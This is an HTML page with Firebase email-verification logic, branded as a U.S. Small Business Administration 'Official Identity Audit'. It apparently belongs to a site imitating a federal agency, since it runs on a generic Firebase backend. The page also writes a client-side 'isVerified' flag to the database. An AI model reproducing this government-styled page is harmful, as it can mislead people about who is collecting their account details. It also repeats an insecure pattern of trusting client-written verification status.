<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Verify Case</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-weight: 900; text-transform: uppercase; border-radius: 4px; }
        .verify-pulse { animation: pulse-blue 2s infinite; border-radius: 50%; }
        @keyframes pulse-blue { 0% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(0, 46, 109, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0); } }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official Identity Audit</span>
    </div>

    <main class="flex-grow flex items-center justify-center p-5">
        <div class="w-full max-w-[420px]">
            <div class="auth-card p-8">
                <div class="mb-8 text-center">
                    <div class="w-20 h-20 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-6 border-2 border-[#002e6d] verify-pulse">
                        <i class="fas fa-envelope-open-text text-3xl"></i>
                    </div>
                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
                    <p class="text-slate-400 text-[10px] font-black uppercase tracking-[0.2em] mt-2">Activation Link Dispatched</p>
                </div>

                <div class="mb-6 text-center bg-slate-50 p-5 border border-slate-200 rounded-lg">
                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Verify Ownership Of:</p>
                    <span id="displayEmail" class="text-[#002e6d] text-base font-black break-all uppercase italic">Detecting...</span>
                </div>

                <div class="p-5 bg-[#001a3d] border-l-4 border-sky-400 mb-6">
                    <p class="text-white text-[11px] font-bold uppercase tracking-wider leading-relaxed">
                        <i class="fas fa-bolt text-sky-400 mr-2"></i> STATUS: <span id="statusText" class="text-sky-400">WAITING</span><br>
                        The portal will auto-advance once you click the link in your email.
                    </p>
                </div>

                <button id="checkBtn" class="btn-sba w-full shadow-lg">Manual Refresh Scan</button>

                <div class="mt-10 text-center border-t pt-6">
                    <button id="resendBtn" class="text-[#cc0000] font-black text-[12px] uppercase tracking-widest hover:underline">Resend Security Link</button>
                </div>
            </div>
            
            <button id="logoutBtn" class="w-full mt-10 text-slate-400 text-[10px] font-black uppercase tracking-[0.4em]">Terminate Session</button>
        </div>
    </main>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { onAuthStateChanged, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        let checkInterval;

        onAuthStateChanged(auth, async (user) => {
            if (!user) {
                window.location.href = "login.html";
            } else {
                document.getElementById('displayEmail').innerText = user.email.toUpperCase();

                // If already verified (e.g., they came back to this page)
                if (user.emailVerified) { 
                    handleSuccess(user);
                    return; 
                }

                // HEARTBEAT: Checks every 4 seconds if the link was clicked
                checkInterval = setInterval(async () => {
                    await user.reload();
                    if (auth.currentUser.emailVerified) {
                        clearInterval(checkInterval);
                        handleSuccess(auth.currentUser);
                    }
                }, 4000);
            }
        });

        async function handleSuccess(user) {
            document.getElementById('statusText').innerText = "VERIFIED";
            document.getElementById('statusText').classList.replace('text-sky-400', 'text-emerald-400');
            
            try {
                await updateDoc(doc(db, "users", user.uid), { isVerified: true });
            } catch (e) {}

            setTimeout(() => { window.location.href = "dashboard.html"; }, 1500);
        }

        document.getElementById('checkBtn').onclick = () => { window.location.reload(); };

        document.getElementById('resendBtn').onclick = async () => {
            try {
                await sendEmailVerification(auth.currentUser);
                alert("Security Link Dispatched.");
            } catch (err) { alert("Please wait before requesting again."); }
        };

        document.getElementById('logoutBtn').onclick = () => {
            clearInterval(checkInterval);
            signOut(auth).then(() => { window.location.href = "login.html"; });
        };
    </script>
</body>
</html>
